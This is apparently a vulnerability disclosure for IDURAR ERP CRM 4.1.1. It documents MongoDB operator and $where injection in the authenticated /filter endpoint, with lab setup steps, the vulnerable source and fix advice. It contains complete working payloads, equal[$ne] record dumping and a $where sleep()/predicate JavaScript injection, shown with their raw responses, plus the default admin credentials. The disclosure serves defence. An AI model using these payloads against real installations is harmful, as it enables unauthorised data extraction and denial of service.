### Vulnerability details

**Official website / Product:** https://www.idurarapp.com / https://github.com/idurar/idurar-erp-crm

**Repository:** idurar/idurar-erp-crm (stars at selection: 8931)

**Vulnerability type:** SQLi (MongoDB NoSQL operator / `$where` injection)

**Vulnerability versions:** IDURAR ERP CRM **<= 4.1.1** (audited tag `4.1.1` / commit `82ff5d1bcb8aa5a3feda5e7f94d71ba00d3a1a50`). Lab: host Node 22 + MongoDB on **27026** (verified with mongodb-memory-server 7.x; equivalent `mongo:6` container below), app on **19306**.

**Vulnerability URL / Parameter:**
- `GET /api/{entity}/filter?filter=&equal=` (authenticated) — entities from app CRUD (`client`, `invoice`, `payment`, `setting`, …)
- Parameters: `filter` (Mongo field **or** operator name such as `$where`), `equal` (string **or** qs-parsed operator object such as `equal[$ne]` / `equal[$regex]`)

**Complex:** yes

### Verification procedure

1. Bring up tag `4.1.1` (host Node ≥20; MongoDB on local **27026**):

```bash
git clone https://github.com/idurar/idurar-erp-crm.git
cd idurar-erp-crm
git checkout 4.1.1

# MongoDB: lab used mongodb-memory-server on 27026; equivalent container:
docker run -d --name idurar-mongo -p 27026:27017 mongo:6

cd backend
npm install

# Backend reads process.env.DATABASE (not MONGO_URI) and PORT; write .env or export:
cat >> .env << 'EOF'
DATABASE="mongodb://127.0.0.1:27026/idurar"
PORT=19306
JWT_SECRET="lab_jwt_secret_for_idurar_4_1_1"
NODE_ENV="development"
OPENSSL_CONF=/dev/null
PUBLIC_SERVER_FILE="http://127.0.0.1:19306/"
EOF

npm run setup
# Expect log lines: Admin created / Settings created; default admin admin@admin.com / admin123
npm run start
# Expect: Express running → On PORT : 19306
```

2. Log in for a Bearer JWT:

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:19306
Content-Type: application/json
Accept: application/json
Connection: close

{"email":"admin@admin.com","password":"admin123"}
```

Use `result.token` (or the equivalent token field) from the JSON response as `Authorization: Bearer …`.

3. Create at least two `client` documents with distinct emails/names (examples):

```http
POST /api/client/create HTTP/1.1
Host: 127.0.0.1:19306
Authorization: Bearer <JWT>
Content-Type: application/json
Accept: application/json
Connection: close

{"name":"Alice Secret","phone":"111","country":"US","address":"Addr A","email":"alice@example.com"}
```

```http
POST /api/client/create HTTP/1.1
Host: 127.0.0.1:19306
Authorization: Bearer <JWT>
Content-Type: application/json
Accept: application/json
Connection: close

{"name":"Bob Public","phone":"222","country":"UK","address":"Addr B","email":"bob@example.com"}
```

4. Send `GET /api/client/filter?filter=name&equal[%24ne]=nomatch` with the JWT — response lists **all** clients (operator injection; expect Content-Length 562, Alice + Bob).
5. Send `GET /api/client/filter?filter=$where&equal=sleep(1500)||(this.email&&this.email.indexOf("alice")>=0)` (optional timing: `curl -o /dev/null -s -w 'time_total=%{time_total}\n' -H "Authorization: Bearer <JWT>" 'http://127.0.0.1:19306/api/client/filter?filter=%24where&equal=sleep(1500)%7C%7C(this.email%26%26this.email.indexOf(%22alice%22)%3E%3D0)'`) — response delayed (~1.5s+; measured `time_total=3.053131`) and returns only matching documents (MongoDB server-side JS).
6. Control: `GET /api/client/list?filter=name&equal[%24ne]=x` returns HTTP 400 (paginatedList.js was patched in PR #1423; **filter.js was not**). Expected body:

```json
{"success":false,"result":[],"message":"Invalid filter value"}
```

### Complete vulnerability PoC

#### PoC A — `equal[$ne]` operator injection (filter.js still unfixed after PR #1423)

Complete HTTP request (lab-verified):

```http
GET /api/client/filter?filter=name&equal[%24ne]=nomatch HTTP/1.1
Host: 127.0.0.1:19306
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjZhZTc2NjhlMzJhM2JkNzYxZDVmOTNmMiIsImlhdCI6MTc5MzU1MDI4NSwiZXhwIjoxNzkzNjM2Njg1fQ.3GnSZdXrQYAXSmZWP3Hs7stSqjPnFGBZrJO81SdYEQU
Accept: application/json
Connection: close

```

Complete HTTP response (raw lab response):

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Vary: Origin, Accept-Encoding
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Content-Length: 562
ETag: W/"232-zpEjbD05zQn1mLXZ/plOwX/Sxls"
Date: Sun, 01 Nov 2026 16:25:16 GMT
Connection: close


{"success":true,"result":[{"_id":"6ae7671e3986e9f15ca7b3f2","removed":false,"enabled":true,"name":"Alice Secret","phone":"111","country":"US","address":"Addr A","email":"alice@example.com","created":"2026-11-01T16:21:50.928Z","updated":"2026-11-01T16:21:50.928Z","__v":0},{"_id":"6ae7671e3986e9f15ca7b3f8","removed":false,"enabled":true,"name":"Bob Public","phone":"222","country":"UK","address":"Addr B","email":"bob@example.com","created":"2026-11-01T16:21:50.943Z","updated":"2026-11-01T16:21:50.943Z","__v":0}],"message":"Successfully found all documents  "}
```

#### PoC B — `filter=$where` server-side JavaScript (sleep + predicate extraction)

Complete HTTP request (lab-verified; URL percent-encoded as captured):

```http
GET /api/client/filter?filter=%24where&equal=sleep(1500)%7C%7C(this.email%26%26this.email.indexOf(%22alice%22)%3E%3D0) HTTP/1.1
Host: 127.0.0.1:19306
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjZhZTc2NjhlMzJhM2JkNzYxZDVmOTNmMiIsImlhdCI6MTc5MzU1MDI4NSwiZXhwIjoxNzkzNjM2Njg1fQ.3GnSZdXrQYAXSmZWP3Hs7stSqjPnFGBZrJO81SdYEQU
Accept: application/json
Connection: close

```

Complete HTTP response (lab-verified; Alice only; curl timing `time_total=3.053131`, ~3s wall clock — proves `sleep(1500)` ran inside MongoDB):

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Vary: Origin, Accept-Encoding
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Content-Length: 320
ETag: W/"140-eN2FQr1F5Lz+Q1QjmGFODCx40jU"
Date: Sun, 01 Nov 2026 16:24:51 GMT
Connection: close


{"success":true,"result":[{"_id":"6ae7671e3986e9f15ca7b3f2","removed":false,"enabled":true,"name":"Alice Secret","phone":"111","country":"US","address":"Addr A","email":"alice@example.com","created":"2026-11-01T16:21:50.928Z","updated":"2026-11-01T16:21:50.928Z","__v":0}],"message":"Successfully found all documents  "}
```

Verification result notes:

- Baseline exact match `equal=Alice%20Secret` returns one client.
- `equal[%24ne]=nomatch` returns **both** Alice and Bob (Content-Length 562) — `$ne` operator reached MongoDB.
- `filter=$where` + `sleep(1500)||...` returns only Alice; curl `time_total=3.053131` (~3s) — proves server-side JS execution in MongoDB.
- Same parameters on `/list` return `{"success":false,"result":[],"message":"Invalid filter value"}` (PR #1423); `/filter` remains fully vulnerable.
- Sink: `backend/src/controllers/middlewaresControllers/createCRUDController/filter.js` — `Model.find({removed:false}).where(req.query.filter).equals(req.query.equal)`; tag `4.1.1` @ `82ff5d1bcb8aa5a3feda5e7f94d71ba00d3a1a50`.

### Vulnerability analysis

Authenticated ERP CRUD mounts `createCRUDController(Model).filter` for each app entity and for settings. The handler builds:

```javascript
Model.find({ removed: false }).where(req.query.filter).equals(req.query.equal)
```

Express query parsing (qs) turns `equal[$ne]=nomatch` into `{ '$ne': 'nomatch' }`. Mongoose then issues `{ name: { $ne: 'nomatch' } }`, i.e. arbitrary MongoDB operators on an attacker-chosen field.

Additionally, `filter=$where` with a string `equal` becomes `{ $where: '<js>' }`, executing attacker JavaScript inside MongoDB (timing via `sleep`, boolean extraction via expressions). Impact: authenticated data enumeration across CRUD collections, private settings via `/api/setting/filter`, and MongoDB JS DoS.

PR #1423 only hardened `paginatedList.js` by rejecting object-typed `equal`. It did **not** change `filter.js`, and it did **not** block operator names in the `filter` key even on `list`.

### Trigger / sink source (full path and line numbers)

```javascript
# File: backend/src/controllers/middlewaresControllers/createCRUDController/filter.js
# Lines: 1-32 (tag 4.1.1)
const filter = async (Model, req, res) => {
  if (req.query.filter === undefined || req.query.equal === undefined) {
    return res.status(403).json({
      success: false,
      result: null,
      message: 'filter not provided correctly',
    });
  }
  const result = await Model.find({
    removed: false,
  })
    .where(req.query.filter)
    .equals(req.query.equal)
    .exec();
  if (!result) {
    return res.status(404).json({
      success: false,
      result: null,
      message: 'No document found ',
    });
  } else {
    return res.status(200).json({
      success: true,
      result,
      message: 'Successfully found all documents  ',
    });
  }
};

module.exports = filter;
```

Route wiring: `backend/src/routes/appRoutes/appApi.js` `router.route(`/${entity}/filter`).get(...)` behind `adminAuth.isValidAuthToken`.

### Fix notes

- Reject non-string `equal` (same check as paginatedList).
- Allowlist `filter` to known schema paths; never accept keys starting with `$`.
- Prefer explicit `Model.find({ removed: false, [safeField]: safeValue })` with validation, or disable the legacy `/filter` route.
